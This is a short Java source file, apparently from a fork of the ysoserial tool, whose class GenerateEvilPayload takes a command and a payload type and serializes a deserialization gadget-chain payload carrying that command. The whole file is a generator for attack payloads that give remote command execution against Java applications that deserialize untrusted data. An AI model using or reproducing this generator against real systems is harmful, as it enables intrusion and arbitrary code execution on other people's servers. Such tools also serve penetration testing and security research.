package org.gaw;

import java.io.PrintStream;

import org.gaw.ysoserial.Serializer;
import org.gaw.ysoserial.payloads.ObjectPayload;
import org.gaw.ysoserial.payloads.ObjectPayload.Utils;

public class GenerateEvilPayload {
    private static final int INTERNAL_ERROR_CODE = 70;

    public static byte[] main(String command, String payloadType) {
        byte[] data = null;
        final Class<? extends ObjectPayload> payloadClass =
                ObjectPayload.Utils.getPayloadClass(payloadType);

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            PrintStream out = System.out;
            data = Serializer.serialize(object, out);
//            Utils.releasePayload(payload, object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        return data;
    }
}
